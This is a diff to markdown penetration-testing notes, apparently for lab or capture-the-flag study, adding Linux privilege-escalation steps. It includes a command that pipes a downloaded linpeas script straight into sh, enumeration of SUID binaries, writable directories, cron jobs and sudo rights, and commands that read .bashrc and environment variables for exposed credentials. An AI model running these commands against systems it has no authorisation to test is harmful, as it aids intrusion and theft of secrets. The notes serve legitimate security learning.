@@ -139,6 +139,18 @@ Use nmap for portscanning.
 
 # linux prives
 
+# Automated linux privesc
+
+First stabilize the shell and then run the following for linpeas
+
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+
+# Manual
+
+
 ## readable /etc/shadow file
 
 The /etc/shadow file contains user password hashes and is usually readable only by the root user.
@@ -167,6 +179,45 @@ Switch to the root user, using the cracked password:
 ```bash
 su root
 ```
+
+## Some interesting files and commands
+
+
+```bash
+cat /etc/issue
+cat /etc/os-release
+ls -lah /etc/cron*
+```
+
+```bash
+crontab -l
+ps aux
+find / -writable -type d 2>/dev/null # This command will find all the writable directories
+find / -perm -u=s -type f 2>/dev/null # this will find all the suids and guids
+```
+
+## Checking the sudo capabilities
+
+Run the following command to check which sudo capabilites does the current user have
+
+```bash
+sudo -l
+```
+
+Then just check the [gftobins](https://gtfobins.github.io/#) for that particualar command.
+
+## Exposed Credentials
+
+Interesting Commands
+
+```bash
+cat .bashrc
+env
+```
+
+
+
+
 
 # Web application enumeration
 
@@ -321,14 +372,6 @@ Once we find the service we wanna target we can use the following command for en
 ```bash
 icacls "service binary file path"
 ```
-
-
-
-
-
-
-
-
 
 ## Unattended Windows Installations
 
